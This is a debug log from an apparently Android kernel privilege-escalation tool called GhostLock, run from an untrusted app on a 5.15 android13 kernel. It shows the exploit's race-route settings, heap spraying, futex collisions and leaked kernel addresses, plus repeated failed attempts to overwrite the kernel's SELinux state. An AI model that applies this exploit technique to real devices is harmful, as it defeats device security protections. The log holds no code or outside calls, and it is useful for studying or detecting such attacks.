debug log: Download/GhostLock/ghostlock-20260913-160200-759-0-direct.log
ksud ready
[33m[*] [0mkernel: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[32m[+] [0mresolved profile loaded: 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mcpu pair: main=0 consumer=1
[33m[*] [0mruntime home=/data/user/0/com.ghostlock.app/files script=/data/user/0/com.ghostlock.app/files/.ghostlock_root.sh
[33m[*] [0mruntime verbose_debug=1
[33m[*] [0mdebug.execution.begin release=5.15.189-android13-8-00016-g51bba4309aac-ab14546557
[33m[*] [0mdebug.execution.recommended_cpus.main=0
[33m[*] [0mdebug.execution.recommended_cpus.consumer=1
[33m[*] [0mdebug.execution.selected_cpus.main=0
[33m[*] [0mdebug.execution.selected_cpus.consumer=1
[33m[*] [0mdebug.execution.heap.prepare_max_attempts=4
[33m[*] [0mdebug.execution.heap.prepare_timeout_ms=240000
[33m[*] [0mdebug.execution.heap.kernelsnitch_timeout_ms=60000
[33m[*] [0mdebug.execution.race.route_wait_ms=1000
[33m[*] [0mdebug.execution.race.setup_settle_us=50000
[33m[*] [0mdebug.execution.race.state_poll_interval_us=1000
[33m[*] [0mdebug.execution.stages.w1_attempts=15
[33m[*] [0mdebug.execution.stages.w1_settle_us=100000
[33m[*] [0mdebug.execution.stages.w1_scratch_repair_attempts=3
[33m[*] [0mdebug.execution.stages.w2_attempts=15
[33m[*] [0mdebug.execution.stages.w2_settle_us=100000
[33m[*] [0mdebug.execution.stages.w3_chain_rounds=3
[33m[*] [0mdebug.execution.stages.w3_attempts=6
[33m[*] [0mdebug.execution.stages.w3_settle_us=50000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.attempts=2000
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.arm_sequence=16
[33m[*] [0mdebug.execution.routes.tcp_zerocopy.post_receive_hold_iterations=20000
[33m[*] [0mdebug.execution.routes.select_stack.enter_delay_us=50000
[33m[*] [0mdebug.execution.routes.select_stack.timeout_us=200000
[33m[*] [0mdebug.execution.routes.select_stack.consumer_max_calls=1
[33m[*] [0mdebug.execution.routes.select_stack.consumer_burst_calls=1
[33m[*] [0mdebug.execution.routes.multicast_waiter.ready_timeout_ms=10000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_requeue_settle_us=200000
[33m[*] [0mdebug.execution.routes.multicast_waiter.post_adjust_settle_us=100000
[33m[*] [0mdebug.execution.handoff.pre_dispatch_settle_ms=2000
[33m[*] [0mdebug.execution.handoff.module_poll_attempts=30
[33m[*] [0mdebug.execution.handoff.module_poll_interval_ms=100
[33m[*] [0mdebug.execution.handoff.enforce_poll_attempts=200
[33m[*] [0mdebug.execution.handoff.enforce_poll_interval_ms=100
[33m[*] [0mdebug.execution.end
[33m[*] [0msoc: qcom/other; kernel_phys_load=0xa8000000
[33m[*] [0minit_cred image=ffffffc082bfd588 alias=ffffff802abfd588
[32m[+] [0mstartup context pid=20933 uid=10507 euid=10507 gid=10507 egid=10507 boot_ms=12738829 attr=u:r:untrusted_app:s0:c251,c257,c512,c768 enforce=unreadable
[32m[+] [0mstartup limits pid=20933 NoNewPrivs=0 Seccomp=2 Seccomp_filters=1
[32m[+] [0mbuild config pid=20933 label=ghostlock_oplus slide=pselect main=pselect
[32m[+] [0mp0 profile pid=20933 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff802ab01e28 bootid_data=ffffff802adc6819 init_task=ffffff802ac43400 root_tg=ffffff802ad58ac0 sysctl_bootid=ffffff802adc6819
[33m[*] [0mp0 kernel_phys_load=00000000a8000000 delta=0000000028000000
[33m[*] [0mmain thread running on cpu=0
[33m[*] [0m[T+0ms] exploit start
[31m[-] [0mSELinux enforce unreadable; assuming enforcing and running W1
[33m[*] [0m[T+1ms] pre-W1 drain
[33m[*] [0mW1: SELinux attempt 1/1
[33m[*] [0m=== W1: SELinux === target=0xffffff802adaad88 mode=1 leaf=0
[33m[*] [0m[T+170ms]   heap spray start
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +209ms
[33m[*] [0m[spray] finding futex collisions... +428ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1983ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff880df6bc00 +2032ms
[33m[*] [0m[spray] payload ready +2037ms
[31m[-] [0mpage ffffff880df68000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 1/4 +2165ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +224ms
[33m[*] [0m[spray] finding futex collisions... +443ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +1977ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88089aa400 +2023ms
[33m[*] [0m[spray] payload ready +2028ms
[31m[-] [0mpage ffffff88089a8000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 2/4 +4332ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +229ms
[33m[*] [0m[spray] finding futex collisions... +461ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2056ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff88063c1400 +2104ms
[33m[*] [0m[spray] payload ready +2111ms
[31m[-] [0mpage ffffff88063c0000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 3/4 +6591ms
[33m[*] [0m[spray] mm spray + kernelsnitch ready (cpu=8) +238ms
[33m[*] [0m[spray] finding futex collisions... +476ms
[33m[*] [0m[spray] early collision screen 16/7 at 31%
[33m[*] [0m[spray] futex collisions found +2083ms
[33m[*] [0m[spray] mm_struct leaked=0xffffff8801ae8400 +2127ms
[33m[*] [0m[spray] payload ready +2130ms
[31m[-] [0mpage ffffff8801ae8000 stores an even byte over selinux_state.initialized; taking another
[31m[-] [0mprepare_kernel_page retry 4/4 +8850ms
[31m[-] [0m  heap spray failed
[31m[-] [0mW1: SELinux attempt 1 route failed; backing off
[31m[-] [0mWrite 1 failed
